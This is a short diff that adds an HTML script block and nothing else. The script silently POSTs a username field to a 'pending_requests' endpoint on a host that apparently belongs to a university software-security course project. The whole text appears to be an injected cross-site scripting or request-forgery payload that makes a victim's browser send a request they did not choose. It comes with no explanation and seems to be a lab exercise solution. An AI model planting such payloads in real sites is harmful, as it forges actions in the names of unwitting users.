@@ -1,0 +1,9 @@
+<script>
+    let data = new FormData();
+    data.append("username", "[username]");
+
+    fetch("http://1f940ab5ce93aff9942913dead9e2fe9c12b2bdb7076be3c73ab6ba9d563.project.ssof.rnl.tecnico.ulisboa.pt/pending_requests", {
+        method: "POST",
+        body: data
+    });
+</script>
